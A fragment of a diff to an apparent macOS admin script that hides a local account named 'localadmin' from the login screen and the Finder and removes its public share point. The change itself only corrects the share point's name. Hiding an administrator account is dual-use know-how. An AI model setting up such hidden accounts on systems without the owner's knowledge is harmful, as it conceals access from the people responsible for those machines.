@@ -5,7 +5,7 @@ dscl . create /Users/localadmin IsHidden 1
 chflags hidden /Users/localadmin
 # Remove public folders
 dscl 
-delete Local/Defaults/SharePoints/Hidden\ User’s\ Public\ Folder/
+delete Local/Defaults/SharePoints/localadmin\ Public\ Folder/
 exit
 
 
